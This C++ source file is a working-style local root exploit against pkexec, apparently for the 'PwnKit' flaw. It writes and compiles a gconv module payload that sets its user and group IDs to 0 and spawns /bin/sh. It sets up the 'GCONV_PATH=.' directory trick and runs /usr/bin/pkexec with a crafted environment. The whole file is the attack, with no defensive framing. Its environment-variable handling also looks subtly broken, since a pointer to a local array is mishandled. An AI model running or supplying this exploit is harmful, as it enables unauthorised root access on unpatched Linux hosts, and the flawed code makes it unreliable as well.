#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

using namespace std;

class Payload{
public:

    const char* executablePayload =
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "   setuid(0); setgid(0);\n"
        "   seteuid(0); setegid(0);\n"
        "   system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
        "   exit(0);\n"
        "}";
};

class TempFile{
public:

    FILE* tempFile = NULL;

    TempFile(const char* nameOfTempFile){
        tempFile = fopen(nameOfTempFile, "w");
        if(tempFile == NULL){
            printf("NULL\n");
        }
    }
};

void createFolders();  // Creates necessary folders
void compilePayload(); // Compiles the temp file
char* prepareEnvVars(); // Sets required environmental variables
void executeCVE(char* envVars[]); // Execute CVE

int main(int argc, char *argv[]) {

    // Create folders first
    createFolders();

    Payload pl  = Payload();

    // Write to temp file
    TempFile tf = TempFile("pwnkit/pwnkit.c");
    fprintf(tf.tempFile, "%s", pl.executablePayload);
    fclose(tf.tempFile);

    compilePayload();
    char* env = prepareEnvVars();
    executeCVE(&env);

    return 0;
}

void createFolders(){
    cout << "Creating required folders." << endl;
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    return;
}

void compilePayload(){
    cout << "Compiling payload." << endl;
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");

    return;
}

char* prepareEnvVars(){
    cout << "Preparing environmental variables." << endl;
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };

    return *env;
}

void executeCVE(char* envVars[]){
    cout << "Executing CVE." << endl;
    // (char*[]){NULL}
    char* empty[] = {NULL};
    execve("/usr/bin/pkexec", empty, envVars);

    return;
}
